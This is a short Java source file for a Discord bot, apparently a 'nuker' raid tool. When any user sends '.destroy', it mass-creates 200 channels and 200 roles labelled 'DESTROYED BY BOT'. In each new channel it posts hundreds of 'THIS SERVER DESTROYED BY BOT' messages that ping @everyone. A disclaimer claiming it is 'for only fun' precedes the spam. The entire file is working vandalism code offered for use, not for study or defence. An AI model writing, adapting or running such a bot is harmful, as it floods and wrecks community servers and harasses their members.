package org.feastgroup;

import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.events.channel.ChannelCreateEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.awt.*;

public class Command extends ListenerAdapter {

    @Override
    public void onChannelCreate(ChannelCreateEvent event) {
        event.getChannel().asMessageChannel().sendMessage("***This bot created for only fun or something.Bot owner is not responsible any actions***").queue();
        int i = 0;
        while (i <= 5000) {
            i++;
            if (i % 7 == 0) {
                event.getChannel().asTextChannel().sendMessage("""
                        THIS SERVER DESTROYED BY BOT\s
                        A
                        A
                        A
                        A
                        A
                        A
                        A
                        A
                        A
                        A@everyone""").queue();

                System.out.println(i);
            }
        }


    }

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        Guild guild = event.getGuild();
        String msg = event.getMessage().getContentRaw();
        if (msg.equals(".destroy")) {
            for (int i = 0; i < 200; i++) {
                guild.createTextChannel("DESTROYED BY BOT ").queue();
                guild.createRole().setName("DESTROYED BY BOT").setColor(Color.RED).queue();
            }
        }
    }
}
